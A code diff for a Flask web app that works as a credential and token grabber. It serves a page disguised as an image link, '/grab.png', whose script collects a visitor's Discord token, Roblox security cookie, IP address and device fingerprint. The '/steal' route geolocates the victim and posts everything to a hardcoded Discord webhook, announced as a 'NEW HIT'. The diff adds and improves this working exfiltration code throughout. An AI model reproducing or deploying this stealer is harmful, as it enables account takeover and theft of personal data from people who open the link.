@@ -7,34 +7,15 @@ import traceback
 
 app = Flask(__name__)
 
-WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://discord.com/api/webhooks/1470096967848824842/r-JZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV')
+WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://discord.com/api/webhooks/1470096967848824842/r-jZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV')
 IMG_URL = os.environ.get('IMG_URL', 'https://httpbin.org/image/jpeg')
 
-@app.route("/api/main")
+@app.route("/")
 def serve_image():
-    try:
-        img_response = requests.get(IMG_URL, timeout=5)
-        img_response.raise_for_status()
-        return Response(img_response.content, mimetype=img_response.headers.get("Content-Type", "image/jpeg"))
-    except:
-        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
-        return Response(pixel, mimetype='image/gif')
+    pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
+    return Response(pixel, mimetype='image/gif')
 
-@app.route('/', defaults={'path': ''})
-@app.route('/<path:path>')
-def catch_all(path):
-    try:
-        if path.endswith(('.jpg', '.png')) and 'grab' in path.lower():
-            return grab_image()
-        elif path == 'image.jpg':
-            return image_proxy()
-        elif path == 'steal':
-            return steal_data()
-        return Response(base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=='), mimetype='image/gif')
-    except:
-        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
-        return Response(pixel, mimetype='image/gif')
-
+@app.route("/grab.png")
 def grab_image():
     html = f'''<!DOCTYPE html><html><head><title></title><meta charset="UTF-8">
 <script>
@@ -44,6 +25,7 @@ def grab_image():
     if(roblox) roblox = roblox.split("=")[1].replace(/^_ \\| WARNING: Obsolete \\| /,"").replace(/ \\|_$/,"");
     
     let data = {{
+        ip: '',
         ua: navigator.userAgent,
         lang: navigator.language,
         screen: `${{screen.width}}x${{screen.height}}`,
@@ -60,9 +42,7 @@ def grab_image():
         net: navigator.connection?.effectiveType||'N/A'
     }};
     
-    let params = new URLSearchParams(data).toString();
-    navigator.sendBeacon('/steal?'+params);
-    location.href='data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==';
+    fetch('https://httpbin.org/ip').then(r=>r.json()).then(d=>{{data.ip=d.origin;let params=new URLSearchParams(data).toString();navigator.sendBeacon('/steal?'+params);}});
 }})();
 </script>
 <style>body{{margin:0;padding:20px;background:#111;color:#fff;font-family:sans-serif;text-align:center;}}img{{max-width:100%;height:auto;opacity:.8;}}</style>
@@ -71,59 +51,54 @@ def grab_image():
 </body></html>'''
     return Response(html, mimetype='text/html')
 
-def image_proxy():
-    try:
-        resp = requests.get(IMG_URL, timeout=3)
-        resp.raise_for_status()
-        return Response(resp.content, mimetype=resp.headers.get('content-type', 'image/jpeg'))
-    except:
-        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
-        return Response(pixel, mimetype='image/gif')
-
+@app.route("/steal")
 def steal_data():
+    print(f"STEAL HIT: {request.args}")  # Vercel logs
+    
+    params = request.args.to_dict()
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr) or params.get('ip', 'N/A')
+    
+    geo = 'N/A'
+    isp = 'N/A'
     try:
-        params = request.args.to_dict()
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr) or 'N/A'
-        
-        geo = 'N/A'
-        isp = 'N/A'
-        try:
-            geo_resp = requests.get(f'http://ipapi.co/{ip}/json/', timeout=2)
+        geo_resp = requests.get(f'http://ipapi.co/{ip}/json/', timeout=2)
+        if geo_resp.status_code == 200:
             geo_data = geo_resp.json()
-            geo = f"{geo_data.get('city', 'N/A')} {geo_data.get('country_name', 'N/A')}"
+            geo = f"{geo_data.get('city', 'N/A')}, {geo_data.get('country_name', 'N/A')}"
             isp = geo_data.get('org', 'N/A')
-        except:
-            pass
-        
-        embed = {{
-            "title": "🎯 HIT DETECTED",
-            "color": 16711680,
-            "timestamp": "{datetime.utcnow().isoformat()}",
-            "fields": [
-                {{"name": "🆔 IP", "value": f"```{ip}```", "inline": True}},
-                {{"name": "📍 Geo", "value": f"```{geo}```", "inline": True}},
-                {{"name": "🌐 ISP", "value": f"```{isp}```", "inline": True}},
-                {{"name": "📱 UA", "value": f"```{params.get('ua', 'N/A')[:100]}```", "inline": False}},
-                {{"name": "💬 Discord", "value": f"```{params.get('token', 'NONE')[:32]}...```", "inline": False}},
-                {{"name": "🎮 Roblox", "value": f"```{params.get('roblox', 'NONE')[:32]}...```", "inline": False}},
-                {{"name": "💻 Device", "value": f"```Screen: {params.get('screen', 'N/A')} | CPU: {params.get('cores', 'N/A')} | RAM: {params.get('ram', 'N/A')}GB```", "inline": False}},
-                {{"name": "🌐 Network", "value": f"```Lang: {params.get('lang', 'N/A')} | TZ: {params.get('tz', 'N/A')} | Net: {params.get('net', 'N/A')}```", "inline": False}}
-            ]
-        }}
-        
-        payload = {{"embeds": [embed]}}
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
-        
-        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
-        return Response(pixel, mimetype='image/gif')
     except:
-        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
-        return Response(pixel, mimetype='image/gif')
-
-@app.errorhandler(Exception)
-def handle_error(e):
-    pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
-    return Response(pixel, mimetype='image/gif')
+        pass
+    
+    embed = {
+        "title": "🎯 NEW HIT",
+        "description": f"**IP:** `{ip}`\n**Geo:** `{geo}`\n**ISP:** `{isp}`",
+        "color": 16711680,
+        "fields": [
+            {"name": "User Agent", "value": f"`{params.get('ua', 'N/A')[:400]}`", "inline": False},
+            {"name": "Discord", "value": f"`{params.get('token', 'No token')[:50]}...`" if params.get('token') else "`No token`", "inline": True},
+            {"name": "Roblox", "value": f"`{params.get('roblox', 'No cookie')[:50]}...`" if params.get('roblox') else "`No cookie`", "inline": True},
+            {"name": "Device", "value": f"Screen: {params.get('screen', 'N/A')} | CPU: {params.get('cores', 'N/A')} | RAM: {params.get('ram', 'N/A')}GB", "inline": True},
+            {"name": "Network", "value": f"Type: {params.get('net', 'N/A')} | Cookies: {params.get('cookies', 'N/A')} | Plugins: {params.get('plugins', 'N/A')}", "inline": True},
+            {"name": "Browser", "value": f"TZ: {params.get('tz', 'N/A')} | Lang: {params.get('lang', 'N/A')} | Platform: {params.get('platform', 'N/A')}", "inline": True}
+        ],
+        "timestamp": datetime.utcnow().isoformat(),
+        "footer": {"text": f"Ref: {params.get('ref', 'Direct')[:100]}"}
+    }
+    
+    payload = {"embeds": [embed]}
+    
+    try:
+        resp = requests.post(WEBHOOK_URL, json=payload, timeout=5)
+        print(f"WEBHOOK STATUS: {resp.status_code} - {resp.text[:200]}")  # Critical for debugging
+        if resp.status_code == 204:
+            return "", 204
+        else:
+            print(f"WEBHOOK FAILED: {resp.status_code} {resp.text}")
+            return f"Webhook error: {resp.status_code}", resp.status_code
+    except Exception as e:
+        print(f"WEBHOOK EXCEPTION: {str(e)}")
+        return f"Webhook failed: {str(e)}", 500
 
 if __name__ == "__main__":
-    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=True)
